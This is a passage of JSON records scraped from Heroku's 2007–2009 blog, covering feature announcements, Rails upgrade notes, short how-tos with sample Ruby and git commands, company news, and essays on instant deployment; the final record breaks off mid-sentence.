{"website": "Heroku", "title": "It's the Little Things", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/sometimes_its_the_little_things", "abstract": "It's the Little Things Posted by Adam Wiggins December 12, 2007 Listen to this article Sometimes, it’s the little things.  A few niceties deployed recently: The code editor UI now has a liquid layout.  If you’re a life hacking / GTD type like me, you’ll especially enjoy this in combination with Firefox’s fullscreen mode.  (FF for OS X doesn’t have fullscreen, unfortunately; try this instead.) Download files from the context menu.  You can use this in conjunction with upload to edit in your local editor, load an image into your photopaint program, etc. Speaking of images, if you click on an image, it will display it in the editor pane. There’s a link to update your account password on the My Apps page.  (Shocked this wasn’t there before?  We’re in beta, dammit, we’re allowed to slack off on stuff like this.) More bugfixes than you can shake a ticket-tracker at. newfeatures", "date": "2007-12-12,"},
{"website": "Heroku", "title": "Rails 2", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/rails_2", "abstract": "Rails 2 Posted by Adam Wiggins December 17, 2007 Listen to this article Rails 2 is now the default for all newly created Heroku apps. Existing apps will continue to run on 1.2 unless you edit config/environment.rb and change the version number manually.  Importing an app will try to guess the Rails version from your environment.rb, but you should double-check after the import to make sure the version is set to what you wanted. We’ll leave a 1.2 gem available for a while, but we’re going to take advantage of our beta status here and keep the time window on this relatively short – perhaps a month or two.  (Don’t worry, by the time the next major Rails release goes around, we’ll have a plan for longer-term support of legacy versions in place.) It’s quite painless to upgrade, especially if you don’t have any deprecation warnings in your logs. Here’s a list of the major features and changes , and here’s some notes to help you upgrade . rails", "date": "2007-12-17,"},
{"website": "Heroku", "title": "Gems & Plugins Manager", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/gems_plugins_manager", "abstract": "Gems & Plugins Manager Posted by Adam Wiggins December 22, 2007 Listen to this article Behold: the Heroku gems/plugins manager. This has been one of our most requested features to date, and we’re glad to finally get this released.  Although you could manually upload plugins previously, this will make the process a lot smoother.  (You can still manually manipulate the files in your vendor directory if you prefer.) To get to the manager, open your vendor directory in the lefthand filenav, and click the link that appears at the top: You can search by name, or browse the list of 2500+ gems and 1000+ plugins.  Once you find what you’re looking for, click on Install in the righthand column to install it into your app.  Click Remove to remove it if it’s no longer needed. You can also upload your own plugin as a tarball or a .gem file.  Just click the Upload link at the bottom.  Once it’s installed, you’ll see it listed alongside your other installed gems and plugins, and you can remove it in the same way.  (Though you’ll need to upload it again if you decide you want it back.) The data for plugins comes from the Agile Web Development plugin directory .  Thanks to Ben Curtis, the site’s author and maintainer, for adding some extra fields to the XML API for us.  The data for gems comes from the relative newcomer Gemtacular . Note that gems with binary dependencies are unlikely to work.  If you’re trying to install a gem and it doesn’t work, email us and we’ll see what we can do.  Additionally, there are quite a lot of gems that don’t make any sense in the context of Heroku – for example, the 3rd party ActiveRecord database adapters, or GUI toolkits like the GTK bindings.  In iteration 2 of this component we hope to flag gems and plugins as Heroku-friendly or not. We made the design decision to mix gems and plugins together in the same view.  This will probably cause at least a few folks to protest “But gems and plugins are nothing alike!”  Make no mistake, we know the difference quite well.  In building the interface, however, it occurred to us that the process of managing them was very similar.  And from a high-level point of view, they are two forks of the same tree: add-ons to extend or modify the behavior of the programming environment of your app. newfeatures gemsplugins", "date": "2007-12-22,"},
{"website": "Heroku", "title": "View-Only Users", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/viewonly_users", "abstract": "View-Only Users Posted by Adam Wiggins January 02, 2008 Listen to this article There are now two access levels for collaborators on Heroku apps: Full edit access , which allows access to everything: editing code, importing or exporting the database, changing the settings, etc. View-only access , which allows the user to view the app only.  That is, they can visit the app url (myapp.heroku.com) but not any of the settings pages or the edit url (edit.myapp.heroku.com). For example, a client who wants to use the app but neither needs nor wants access to the code could be set as a view-only user. If your app sharing is set to public, the view-only access level has no use. Do note that these settings have no effect on users changing your app’s data through the normal web front-end.  For example, if you have a scaffold page that doesn’t perform any authentication, a view-only user can create, update, and delete records.  When we say “full edit access” we’re referring to editing code.  What happens when the user views your app is up to you. newfeatures sharing", "date": "2008-01-02,"},
{"website": "Heroku", "title": "Goodbye Rails 1.2", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/rails_12_deprecated", "abstract": "Goodbye Rails 1.2 Posted by Adam Wiggins January 02, 2008 Listen to this article Rails 1.2 is now officially deprecated for Heroku apps.  Starting January 3 (that’s tomorrow), new features we are developing will not be available on apps still configured to use Rails 1.2.  Then, on January 21, we will automatically upgrade any remaining 1.2 apps. We know it’s only been a month since Rails 2 came out, so we hope this doesn’t come across as overly harsh.  By taking this approach we can spend less time backporting, which means more time for new features.  Since Heroku is still in early beta we feel that this is reasonable.  Rest assured that when the next major Rails release comes around, we’ll be committed to supporting 2.0 for a much longer time window. In most cases, upgrading should be as easy as changing your `config/environment.rb` to contain 2.0.2 instead of 1.2.x, and adding a block that looks like this to your initializer: config.action_controller.session = {\n        :session_key => '_my_app_session',\n        :secret      => '241b740a2f480d9776e6ce0c36b51f9df46ecf1d25814cd03b4d14dbb6ba7cd92'\n} If you find that you have breakage after the upgrade, read this post by Steve Ross which covers potential areas of incompatibility in detail. And if you’re still having difficulty with the upgrade, just send us an email with the name of your app and we’ll be happy to help. rails", "date": "2008-01-02,"},
{"website": "Heroku", "title": "Heroku Loves RSpec", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/rspec", "abstract": "Heroku Loves RSpec Posted by Adam Wiggins January 03, 2008 Listen to this article RSpec 1.1 is now a part of the default plugin kit for Heroku apps. We’ve been fans of RSpec for a while now, and feel that it represents the future of TDD / BDD for the Rails world.  If you’re not familiar with RSpec, read up and then give it a try. You don’t need to install anything to use RSpec in your Heroku app, but you do need to initialize the spec/ and stories/ directories by running the rspec generator.  Just open the Generate dialog, type in rspec , and click Run. Once you’ve written some specs, you can run them the usual way: open a rake console and type spec .  You can still run your Test::Unit tests with the test command, or you can run tests followed by spec with default . Don’t worry, support for Test::Unit won’t be going away any time soon – but we do encourage you to consider RSpec the next time you create a new model.  Use the generate command rspec_model instead of the usual model to get a blank spec created for you.  Or, use rspec_model &lt;model_name&gt; against an existing model and it will generate the spec (in spec/models ) without overwriting the existing model or migration. newfeatures bdd", "date": "2008-01-03,"},
{"website": "Heroku", "title": "Rails Hosting: Easy as Pie", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/easy_as_pie", "abstract": "Rails Hosting: Easy as Pie Posted by Adam Wiggins January 12, 2008 Listen to this article Yesterday, DHH said : “I’d love for Rails to be easy as pie to run in a shared hosting environment, though. I’d love for Rails to be easy as pie to run in any environment. In that ‘more people could have fun learning Rails and deploying their first hobby application’ kind of way.” We humbly suggest that Heroku is one possible solution to the latter part of statement.  Our vision for the long term is much grander than just a learning/hobby tool; but our beta product, as it stands today, can already fill this need quite nicely. news rails", "date": "2008-01-12,"},
{"website": "Heroku", "title": "Easy Authentication", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/heroku_user", "abstract": "Easy Authentication Posted by Adam Wiggins January 14, 2008 Listen to this article Backstory: A Fiery Debate Writing a user model and the standard login authentication code seems like busywork to a lot of coders.  In fact, many people expected a next-generation app framework such as Rails to handle this for you.  After all, Django does .  Initially the login engine for Rails seemed to fill this slot, but following a fair amount of controversy over best practices, the login engine was killed by its creator. With our BDfL having forever cursed prebuilt login systems , the Rails community mostly stopped trying to make them.  Yet, this puts us back at square one: developers are annoyed at the amount of boilerplate busywork that is necessary for almost every web app they write. acts_as_authencated is the halfway solution that is now popular: it’s a generator, not a drop-in component, so it spits out the boilerplate for you, and then you can modify it.  And then of course there’s the idea that logins shouldn’t be maintained by individual sites at all, but stored someplace in the ownership of users. OpenID is the great hope here, but while we wait for this technology to mature (and gain acceptance with less technical audiences), maintaining user logins will continue to be a part of building web apps. The debate over how to create login authentication will continue to smoulder for some time yet.  But in the meantime, Heroku now offers a user login solution that will be handy for apps shared with a small number of people, and requires almost no code. Heroku Users Apps created on Heroku are already shared with some number of users, specified by their email addresses (this works the same as other types of collaborative editing apps, such as Google Docs).  Since these users are already logging in to access the app, wouldn’t it be handy if you could find out from the Heroku backend who was logged into your app? We thought so too.  Which why we’ve created the heroku_user helper object.  It’s a small feature, but a surprisingly convenient one.  I’ve already found it quite useful in some of my own personal apps.  Our company wiki, for example, uses this method.  So how does it work? Accessing heroku_user Within any controller, helper, or view, you can access the heroku_user object, which has the methods email , logged_in? , and can_edit? . email provides the email address of the Heroku user currently accessing the app.  It will be blank if they are not logged in.  (For privacy’s sake, you can only access this data if the user is on the collaborators list for the app.  That is, a public app can’t snoop on the heroku_user info of logged in heroku users who visit the site anonymously.) logged_in? checks if email is not blank – a convenience / code-readability method. can_edit? returns true if the user is a collaborator on the app, or false if they only have view access.  Take note: this refers to the capability to edit the source code .  They can still write to your app through its regular web interface.  If you are using a standard scaffold, for example, users will be able to add and remove data like always. can_edit? == true means that they can flip to the Heroku code editor and start tinkering under the hood. An Example Let’s say you’re writing the quintessential Rails app, a blog.  Rather than having an author_id on your posts, you’d instead just have a string field author which is filled in with the email address from heroku_user .  Creating a post might be: def create\n  @post = Post.new(params[:post])\n  @post.author = heroku_user.email\n  if @post.save\n    ... Validating that a user can only delete their own posts would be: def create\n  @post = Post.find_by_id_and_email(params[:id], heroku_user.email)\n  if @post\n    @post.destroy\n    ... If you want to show the current user in your layout somewhere, that’s a cinch: <% if heroku_user.logged_in? %>\n  Welcome, <%= heroku_user.email %>\n<% end %> Storing Your Own Data What about storing data for the user, such as app-specific preferences?  Using heroku_user , you have no user model.  One approach that I’ve used in my own apps is to create a user model on the fly, based on the heroku_user value.  That is, something like: before_filter :create_user_mirror\n\ndef create_user_mirror\n  @user = User.find_by_email(heroku_user.email) || User.create!(:email => heroku_user.email)\nend But wait, wasn’t the point to avoid creating our own user model?  Well, sure – but if you have some extra data you need to attach, this is only a few lines in your application controller and a model with just one field.  You don’t have to deal with user management, password reminders, or password salting.  Avoiding responsibility for user passwords is nice for a smallish app that you’re throwing together quickly, and may only be shared with a limited number of people anyway. It’s Not For Everyone This is probably not a general-purpose solution to the login problem.  It is, however, a solution that may prove convenient in many situations.  If you’re making a public app which is expecting a large user base, you’ll want complete control over the login process.  In that case, you might use the Heroku user info as temporary scaffolding to get you off the ground, so that you can focus on more interesting parts of the app initially.  Later on you can come back and write the boring old login code, same as always. But if you’re writing a prototype, or an app for internal use at your company, or even just to share with a few friends or family members, then heroku_user can save you time and let you get straight to coding the business logic of your app. newfeatures sharing", "date": "2008-01-14,"},
{"website": "Heroku", "title": "We're Huge in Japan", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/were_huge_in_japan", "abstract": "We're Huge in Japan Posted by Adam Wiggins February 05, 2008 Listen to this article Last night we noticed a flood of .jp email addresses appearing on the waiting list – several hundred over the course of just a few hours.  Turns out someone posted a comprehensive and flattering review of Heroku in Japanese (translation) .  I just couldn’t resist using the opportunity to post this image: Actually, it’s not just Japan: the international response to Heroku has astonished us. Denmark , New Zealand, France , Russia , Brazil –  over half of our users are from outside the US.  We chalk this up more to the universal appeal of Ruby and Rails than anything we’ve done, but either way it’s pretty cool. By the way, we know news on the Heroku front has been a little quiet lately.  That’s because we’ve got some big stuff brewing.  Stay tuned – the best is still yet to come. press", "date": "2008-02-05,"},
{"website": "Heroku", "title": "Heroku on the Rails Podcast", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/rails_podcast", "abstract": "Heroku on the Rails Podcast Posted by James Lindenbaum February 10, 2008 Listen to this article If you’re curious about our vision for Heroku, check out the latest episode of the Ruby on Rails Podcast .  We spoke with Geoffrey Grosenbach about our plans for Heroku, the Rails ecosystem, and some good old fashioned economics. press", "date": "2008-02-10,"},
{"website": "Heroku", "title": "Heroku Mailing List", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/heroku_mailing_list", "abstract": "Heroku Mailing List Posted by Adam Wiggins February 11, 2008 Listen to this article Heroku now has a mailing list on Google Groups.  Stop by and introduce yourself, but first read the welcome post . news", "date": "2008-02-11,"},
{"website": "Heroku", "title": "API and External Git Access", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/api_and_external_git_access", "abstract": "API and External Git Access Posted by Adam Wiggins March 03, 2008 Listen to this article Heroku now has an API (accessible from the command line, a Ruby library, or REST calls), revision control on all apps with Git, and remote access to the Git repository. The combination of these new features means that you can now work on your apps using the local tools you love – like TextMate, vi, or emacs – and still get the benefit of zero-configuration deployment to Heroku. How does it work?  Grab the Heroku gem with “gem install heroku”.  A sample work session looks like this: heroku clone myapp\ncd myapp\nruby script/server\n…edit locally…\ngit add .\ngit commit -m “local changes”\ngit push The final step will deploy the app to Heroku, including running the migrations on the database and restarting the server. Watch the screencast to see it in action, or just grab the gem and give it a try yourself. RDocs here. Combine your local tools and the Heroku in-the-cloud development tools in any combination you like.  Perhaps you want to work locally while at home, but use the web editor when traveling.  Every commit to the repository is available from both. newfeatures api revisioncontrol", "date": "2008-03-03,"},
{"website": "Heroku", "title": "Heroku & Redpoint Ventures", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/heroku_redpoint_ventures", "abstract": "Heroku & Redpoint Ventures Posted by James Lindenbaum May 08, 2008 Listen to this article We are happy this morning to announce we’ve raised a $3 million round of funding, from Redpoint Ventures and some other great investors. Adam, Orion, and I started Heroku with the goal of making software development much easier and more accessible.  We’ve got big plans – what we’ve done so far is really just the first step.  There is so much we’ve been dying to do, but we just haven’t had the capacity. This investment will allow us to beef up our current offerings, expand into other parts of the development process, and build out the company to support our quickly growing developer community. This deal has been in the works for a few months, and we’re just so excited to have both the financial resources and partners like Redpoint to help us realize our vision. In the meantime, our private beta is really rocking.  We now have over 10,000 developers building apps on the platform, with over 12,000 apps built so far.  This enormous amount of activity is really helping us to hone Heroku into a smooth and sharp tool, and we look forward to opening up the beta in the coming months. We can’t wait to unveil some of the stuff we’ve got in the pipeline.  Stay tuned! Quote (Adam to investors): “I’m not coming to any board meetings earlier than 3pm.” Quote (James to investors): “Who’s the CEO ?  Well, I lost rock-paper-scissors, so I guess that’s me.” Quote (Orion to investors): “Can I get some of that in quarters?  My laundry is really starting to pile up.” More coverage: VentureBeat , TechCrunch news press", "date": "2008-05-08,"},
{"website": "Heroku", "title": "Heroku at RailsConf", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/heroku_at_railsconf-2008", "abstract": "Heroku at RailsConf Posted by James Lindenbaum May 27, 2008 Listen to this article If you’re coming to RailsConf this weekend, definitely come by and see us – we’ve got a lot going on: Orion, Morten, James, and Adam are speaking about why Heroku means never thinking about hosting or servers again on Saturday at 1:50pm. Adam is speaking about HTTP routing and Custom Nginx Modules on Saturday at 2:50pm. And James is speaking about the Rails stack, Rack, and advanced Mongrel on Sunday at 10:45am. Heroku’s got a big booth in the exhibit hall, where we’ll be hanging out, hacking, answering questions, and giving away swag. We’re also going to be hosting Geoffrey Grosenbach recording podcast interviews, live from our couch.  He’s got several awesome interviews lined up: Friday, Lunch — Ryan Singer of 37signals Friday, 3:40pm — GitHub Founders Saturday, Lunch — Phusion Passenger (mod_rails) Saturday, 3:40pm — Adam Keys interviews Geoffrey Come by and check it out. news", "date": "2008-05-27,"},
{"website": "Heroku", "title": "Heroku API Update", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/heroku_api_update", "abstract": "Heroku API Update Posted by Adam Wiggins September 03, 2008 Listen to this article The Heroku API gets a major update today; you can now view and manage all of your application’s settings straight from the command line.  New in this version: Manage sharing (add/remove/list collaborators) Manage multiple ssh keys for your user (add/remove/list keys) Update settings (public true/false, mode production/development) Rename an app Run rake tasks remotely A taste of the new command-line goodness: adam@kvasir:~$ heroku create gagetron\nCreated http://gagetron.heroku.com/ | git@heroku.com:gagetron.git adam@kvasir:~$ heroku info gagetron\n=== gagetron\nWeb URL:        http://gagetron.heroku.com/\nGit Repo:       git@heroku.com:gagetron.git\nMode:           development\nPublic:         false\nCollaborators:  adam@example.com (edit) adam@kvasir:~$ heroku sharing gagetron --add joe@example.com\njoe@example.com added as a view-only collaborator on gagetron. adam@kvasir:~$ heroku rake gagetron routes\n(in /mnt/home/userapps/27934)\n  /:controller/:action/:id         \n  /:controller/:action/:id.:format There’s a new screencast which shows managing sharing from the command line.  We’ve also updated the screencasts which show how to use the API and Git to edit locally, then deploy to Heroku. Grab the new gem from Rubyforge with gem install heroku, read the docs , or browse the source . newfeatures api", "date": "2008-09-03,"},
{"website": "Heroku", "title": "How-To: Heroku + Hoptoad", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/23_howto_heroku_hoptoad", "abstract": "How-To: Heroku + Hoptoad Posted by Adam Wiggins September 17, 2008 Listen to this article Hoptoad is a great service by Thoughtbot for collecting exceptions.  Like exception_notifier, but without clogging your inbox, and much prettier. Using Hoptoad with Heroku is a cinch.  First, sign up for a free Hoptoad account . Now install their notifier plugin.  If you’re working locally and deploying to Heroku with Git, install with script/plugin: script/plugin install git://github.com/thoughtbot/hoptoad_notifier.git Or if you’re using the Heroku web editor, open the vendor folder and click Gems & Plugins, then enter the plugin URL in the “Install from URL ” box at the bottom. Next, create a new file config/initializers/hoptoad.rb containing: HoptoadNotifier.configure do |config|\n  config.api_key = 'your_key_here'\nend Paste in the API key provided for your account in place of your_key_here. Last, add this line to your app/controllers/application.rb: include HoptoadNotifier::Catcher To test, create a page that throws an exception: class CrashController < ApplicationController\n        def index\n                raise \"boom\"\n        end\nend If you’re in the web editor you can navigate straight to your app.  If you’re working locally, commit and push to Heroku: git add .\ngit commit -m 'use hoptoad for exception notifications'\ngit push Now hit http:// yourapp .heroku.com/crash to generate an exception.  Flip over to your Hoptoad account, and you should see your CrashController exception in all its Hoptoad splendor! howto", "date": "2008-09-17,"},
{"website": "Heroku", "title": "Heroku at Rubyconf", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/24_heroku_at_rubyconf", "abstract": "Heroku at Rubyconf Posted by Morten Bagai November 04, 2008 Listen to this article Rubyconf is upon us, and most of engineering team will be present in Orlando this week. If you’re attending, or maybe just nearby, this would be a great opportunity to say hi and/or ask those burning questions you’ve got about Heroku. Whether you’re wondering if Heroku will be a good fit for your needs, or have questions about a currently hosted app, we’re happy to make time for you. Just email us here and we’ll find a time/place to talk. Last but not least, don’t forget to catch Adam and Blake presenting on Lighweight Web Services with Sinatra and Restclient on Friday at 1:15pm. See you there! rubyconf news", "date": "2008-11-04,"},
{"website": "Heroku", "title": "Rails 2.2 on Heroku", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/25_rails_2_2_on_heroku", "abstract": "Rails 2.2 on Heroku Posted by Adam Wiggins November 26, 2008 Listen to this article The gem for Rails 2.2 is now installed and ready for use on Heroku.  To use, change your environment.rb to read: RAILS_GEM_VERSION = '2.2.2' Then run rake rails:update, and commit the changed files. Check out the Ruby Inside article for more details on what’s new. rails", "date": "2008-11-26,"},
{"website": "Heroku", "title": "What's Up at Heroku", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/whats_up_at_heroku", "abstract": "What's Up at Heroku Posted by James Lindenbaum January 11, 2009 Listen to this article 2008 was a very, very big year for Heroku.  We launched the first version of the platform, picked up some world-class investors, expanded the team with some amazing talent (there are 10 of us now), spoke at a zillion conferences about Ruby, Rails, Sinatra, the web stack, and cloud computing, and have grown like crazy. Private Beta Most importantly, we’ve had an incredibly successful private beta.  We launched it less than a year ago, and we have well over 20,000 apps running on Heroku today.  This is one of the largest collections of Rails apps in the world, ranging from enterprise software to web 2.0 apps to iPhone app backends, and everything in between.  This richly diverse environment has been perfect for testing the platform. What We Learned Going from zero to 20,000 apps has been no small feat, and we’ve had plenty of growing pains.  We also learned what our users want from a commercial version of the platform, and surprisingly to us, we discovered that there aren’t just a bunch of features we need to add, but some we need to remove as well (platform features often involve trade-offs). Having made that discovery, we knew we needed to create a second version of the platform, to pursue exactly those requirements, designed from the ground up (with our hard earned knowledge) for commercial production use. We started this new version 4 months ago, in a separate cluster, along with its own private beta, which we’ve let about 1,000 apps into so far. Heroku Garden Thousands of people use and love the first version of our platform, particularly the web-based editor, as it’s the best place to get started with Rails.  We are going to keep this version free, and move it completely over to herokugarden.com.  We’ll post more details about this transition shortly. Commercial Platform The second version of our platform is almost ready for release, as the results of the beta are showing excellent reliability and performance. This second version will form the foundation of our commercial offering (the commercial version will still accommodate free usage).  You will be hearing more about this over the next couple of months as we bring it out of private beta. We have some really exciting stuff in store for you – 2009 is going to be even bigger. news", "date": "2009-01-11,"},
{"website": "Heroku", "title": "Heroku + Suspenders", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/27_heroku_suspenders", "abstract": "Heroku + Suspenders Posted by Morten Bagai January 12, 2009 Listen to this article Making Rails readily accessible to developers of all stripes is a big part of the vision behind the Heroku platform, and we try to be supportive of any initiatives that make teaching and learning Rails easier. A couple of months ago, thoughtbot released suspenders – a freely available Rails template app, loaded with commonly used plugins, sensible configuration options and helpful rake tasks. Simple as it may seem, having a solid default app template is a really important step in eliminating the barriers that prevent developers from jumping directly from concept to coding with Rails. We think thoughtbot are doing the Rails community a real service with this project, so do yourself a favor and check out the github repo and take it for a spin. Naturally, suspenders runs wonderfully on Heroku :) rails learning", "date": "2009-01-12,"},
{"website": "Heroku", "title": "The Future of Deployment", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/future_of_deployment", "abstract": "The Future of Deployment Posted by Adam Wiggins February 05, 2009 Listen to this article Application deployment is changing.  In relatively short order I’ve gone from buying hardware, to monthly hosting, to metered CPU time, and from building my open-source software manually, to package managers, to fancy config tools and recipes to pre-build whole machine images.  What’s next? The Old Way I can deploy Rails apps in a traditional hosting environment pretty quickly.  For a small app, I might make a new unix user and database on a personal Slicehost slice and do a quick code checkout.  After setting up a few permissions and twiddling my Nginx config, in a matter of fifteen minutes or so my app is online.  Not bad at all. For a bigger app, it takes more time.  In days of yore I’d build a server from parts or buy one of the excellent Pogo Linux servers and put it in a colo.  OS install, Xen setup, guest OS install, OS package setup, security lockdown, then on to the task of all the stack setup (database, Rails, source control) specific to the application to be run. Once you get into multiple servers, the complexity multiplies out quickly.  There are dozens of small decisions to make about how resources are allocated.  More RAM or more CPU for the database machine?  One slave database, or two?  Hardware load balancer vs. multiple IPs vs. something else?  All of these require both detailed knowledge about hardware and software deployments, combined with a huge amount of predictive guesswork to try to foresee the quantity and type of load that the app being deployed is likely to face in the next 3, 6, or 12 months. There’s an enterprisey word for this process: provisioning. The New Way Amazon’s EC2 is the vanguard of the new generation of cloud computing.  Provisioning a server was formerly a phone call and days or weeks of waiting.  Now it’s a REST call and 30 seconds of waiting.  Awesome. But this is a very raw resource: there are still many provisioning decisions to be made, software to set up, and then on to deployment of the app itself.  Excellent services like RightScale and Engine Yard’s new offering Solo can help automate a lot of this process and minimize the management burden.  So far, so good. But what if provisioning was instantaneous, requiring no upfront decisions about resource allocation?  What if you didn’t need to think at all about the server hardware or software, but only about your application code?  How would this change how we build applications? The Future When technology breakthroughs make something smaller, or faster, or cheaper, it doesn’t just change current use; it creates whole new types of use .  If app deployment is instantaneous, without having to plan for resources, allocate servers, or beg approval from the IT department, what kind of apps will we build that don’t get built today? In the past decade we’ve seen widespread adoption of agile methodologies in the development of software.  This has transformed software development from a slow, failure-prone, and sometimes downright painful process into one that is fast, fun, and fulfilling.  But deployment of applications has changed hardly at all during that same time period.  The way you deploy a Rails, Merb, Sinatra, or Django app today is very similar to how you deployed a Perl app in 1999. This coming decade is going to see an agile revolution for the deployment side of the equation.  The manual, guesswork-heavy methods of provisioning that we use today are soon to be superseded by methods that will make deploying an app fast, easy, and fun. No one knows quite what that will look like yet (though at Heroku we certainly have our own opinion ), but one thing is for sure: the time is ripe for a revolution in IT. philosophy", "date": "2009-02-05,"},
{"website": "Heroku", "title": "Build a news site with Rubyflow", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/build_a_news_site_with_rubyflow", "abstract": "Build a news site with Rubyflow Posted by Morten Bagai February 10, 2009 Listen to this article Ruby journalist extraordinaire, Peter Cooper, is a busy man. Chances are you’re already following his work to bring you the latest Ruby news on sites such as Ruby Inside and RubyFlow . Late last year he even added a tremendously useful site oriented towards iPhone and iPod Touch development called Mobile Orchard . Somewhere along the line he was also generous enough to leak the source code for Rubyflow, and now a version of that is available through Sutto’s Github repository .That’s great news for anyone looking to start their own news site, especially since it’s a breeze to get working on Heroku. Start by cloning the source from Github: $ git clone git://github.com/Sutto/rubyflow.git Rubyflow depends the thoughtbot-factorygirl gem, so next we’ll make sure to install that and unpack it in vendor/gems: $ rake gems:install\n$ rake gems:unpack I also found that the captcha used in Rubyflow’s user registration requires “digest/sha1” to be required explicitly, so go ahead and add require 'digest/sha1' at the bottom of config/environment.rb. Once you’ve done that it’s time to commit our changes to git: $ git add .\n$ git commit -m \"vendored gems and required digest/sha1\" With that out of the way, it’s time to create an app on Heroku and deploy to it: $ cd rubyflow\n$ heroku create \nCreated http://high-fire-37.heroku.com/ | git@heroku.com:high-fire-37.git\nAdded git remote heroku\n$ git push heroku master\n...\nApp deployed to Heroku. Finally, we run migrations to set up the application database: $ heroku rake db:migrate …and there you have it! Be sure to read the docs on site configuration and customization here . Enjoy! apps", "date": "2009-02-10,"},
{"website": "Heroku", "title": "Why Instant Deployment Matters", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/why_instant_deployment_matters", "abstract": "Why Instant Deployment Matters Posted by James Lindenbaum February 23, 2009 Listen to this article How much better are two steps than three?  Does it matter if something takes five minutes instead of twenty? When it comes to software deployment and provisioning, does instant really matter? Recently, I was ranting on this subject to a user who had the misfortune of asking me about it in person. “Truly instant provisioning and deployment is the ultimate goal,” I said. “10 seconds isn’t good enough. We have to –”, “Look,” he interrupted, “I love what you guys are doing and don’t want you to stop, but why are you so obsessed with this?” My immediate answer: because we’re obsessive people. A couple years ago we stumbled across what we view as a glaring disconnect between the way software is developed and the way it’s provisioned and deployed. Now, like a person who’s noticed a crooked picture on the wall, we are totally fixated on setting it straight. This was a shallow answer though, and he wasn’t convinced: “I mean it’s not that bad as is, is it?” he said.  “It’s been improving steadily for years.” And that’s when it hit me. While everyone is adversely affected by this growing problem, most people don’t actually see it. It has crept up on us gradually. 1996 : A development team of perhaps 10 people (toting advanced computer science degrees) spends 6 months building software to laboriously defined specifications, writing their own framework, and using limited libraries and no testing harness. It then takes an IT team of say 3 people a couple of weeks to provision server resources, configure and install the OS and software stack, and deploy the software. 2000 : A more ambitious team of 6 people (toting half-finished computer science degrees) spends 3 months building a web application to satisfy a PRD , using primitive frameworks and some integration testing. It then takes 3 people about a week (optimistically) to provision servers from IT, install the web stack, and deploy the app. 2004 : A 4-person team (half of whom went to art school) spends 4 weeks writing a web app to some short and loose specs, using decent frameworks, unit and integration testing, and lots of user feedback. It then takes just 2 people about a week to provision virtual servers, install a complete web stack, and deploy the app. 2008 : An agile team of 4 people (plus perhaps a scrum master) spend a week building the first complete version of their web app from just a rough user story, using advanced web frameworks, fully featured libraries, test-driven development, and sharp agile practices. It then takes just one person a few days to provision new resources from IT or a fast-moving hosting company, install the default web stack, and do the initial deploy. Let’s look at these data points: The bottom row is the percentage of the total project/iteration time spent on provisioning and deployment. Look at it this way: This is shocking. Provisioning and deployment has gotten 10x faster during this period, but development has gotten 130x faster. Development teams are getting smaller and more agile, doing shorter iterations (deploying more often), and scaling their apps more quickly (more frequent provisioning). This results in a dramatic increase in the portion of time spent provisioning and deploying. At this rate, in less than 3 years we’ll be spending as much time deploying and provisioning as we spend developing. These numbers are based on our direct experience with medium/large company software projects. You can play around with the scenarios; even with widely different numbers the curve is about the same. The reason most people don’t see this growing problem is because it’s masked by the gradual improvement of the deployment and provisioning process. Capistrano, for example, is an awesome deployment tool, which makes us feel great about the improving state of deployment tools. But these incremental improvements aren’t keeping up with agile development; they’re an investment in a race that can’t be won. We see this playing out often now. We’ve been contacted by quite a few Fortune 500 companies lately who, after a massive agile restructuring of their software development organization, discovered they are now spending as much time on provisioning as development. All the economic benefit of agile development is consumed by provisioning – this has enormous fiscal impact. How do we solve this problem? It doesn’t seem possible to both make provisioning/deployment faster than development, and also keep it there by continuously improving at a higher rate. How do we get off this treadmill? What if we could provision and deploy instantly? This is where the difference between “a little” and “none” comes into play. If it’s instant, the portion of time spent on it goes to zero. The development process can then improve at any speed, and deployment/provisioning will never become a barrier. Problem solved. This is, by the numbers, why instant deployment matters. How are we actually achieving instant deployment?  Over the next two weeks we’ll be posting more information on the challenges involved, and how we’ve designed Heroku’s architecture to meet them. philosophy instant", "date": "2009-02-23,"},
{"website": "Heroku", "title": "Deployment That Just Works", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/deployment_that_just_works", "abstract": "Deployment That Just Works Posted by James Lindenbaum March 03, 2009 Listen to this article Last week I talked a bit about why instant deployment matters .  A few people have since commented that it’s not instant deployment that matters to them, but rather deployment that just works every time. Of course, what we’re really talking about is both. Part of achieving deployment that just works is decreasing complexity and removing steps – each a point of possible failure. We are working toward deployment that’s both instant and completely reliable, because we think those things are tightly linked. We’ve rolled out some new content today explaining more about how our platform works , including some more detailed architectural information. We’re hoping it will continue to build a better picture of the vision we’re striving for.  I want to take some time here to explain some of the background behind this architecture. Instant deployment that just works is, of course, a tall order. In order to achieve it, there are several requisites: 1. A Sharp Focus on Web Apps Provisioning is different for different types of apps – a video transcoding farm is very different from a web app. The only way to make the process instant is to know what type of thing you’re dealing with ahead of time. This is achieved by only handling one type of thing (Heroku, for example, only handles web apps, and even then, only those written in the ruby language). 2. Standardization of App Structure Any time you want to plug and play, most of the work is centered around standardization. Because all lamps have the same power plug and voltage requirements, you can move them around freely and plug them in anywhere. Similarly, all apps need to be self-contained and have the same structure and environmental requirements. A software framework like Ruby on Rails (or even just Rack) gets us most of the structure we need, but a lot of work remains in self-containment and standardization of environmental requirements. 3. A Dynamic Platform Aside from standardized plugs and voltage, the reason you can 